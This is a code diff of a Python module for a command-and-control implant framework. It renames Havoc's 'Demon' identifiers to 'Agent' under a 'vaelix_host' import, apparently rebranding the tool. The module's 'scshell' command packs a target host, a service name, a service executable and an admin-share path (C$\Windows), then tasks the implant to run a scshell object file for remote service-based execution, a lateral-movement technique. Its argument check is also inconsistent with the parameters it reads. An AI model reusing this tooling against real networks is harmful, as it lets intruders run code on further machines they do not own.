@@ -1,9 +1,9 @@
-from havoc import Demon, RegisterCommand, RegisterModule
+from vaelix_host import Agent, RegisterCommand, RegisterModule
 from os.path import exists
 
-def scshell( demonID, *params ):
+def scshell( agentID, *params ):
     TaskID : str    = None
-    demon  : Demon  = None
+    agent  : Agent  = None
     packer : Packer = Packer()
 
     Host      : str   = ""
@@ -11,10 +11,10 @@ def scshell( demonID, *params ):
     SvcPath   : str   = ""
     SvcBinary : bytes = b''
 
-    demon = Demon( demonID )
+    agent = Agent( agentID )
 
     if len(params) < 2:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Not enough arguments" )
         return
     else: 
         Host    = params[ 0 ]
@@ -22,22 +22,22 @@ def scshell( demonID, *params ):
         SvcPath = params[ 2 ]
 
         if exists( SvcPath ) == False:
-            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
+            agent.ConsoleWrite( agent.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
             return
         else:
             SvcBinary = open( SvcPath, 'rb' ).read()
             if len(SvcBinary) == 0:
-                demon.ConsoleWrite( demon.CONSOLE_ERROR, "Specified service executable is empty" )
+                agent.ConsoleWrite( agent.CONSOLE_ERROR, "Specified service executable is empty" )
                 return
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute {SvcPath} on {Host} using scshell" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to execute {SvcPath} on {Host} using scshell" )
 
     packer.addstr( Host )
     packer.addstr( SvcName )
     packer.addstr( SvcBinary )
     packer.addstr( "\\\\" + Host + "\\C$\\Windows\\" + SvcName + ".exe" )
 
-    demon.InlineExecute( TaskID, "go", f"scshell.{demon.ProcessArch}.o", packer.getbuffer(), False )
+    agent.InlineExecute( TaskID, "go", f"scshell.{agent.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
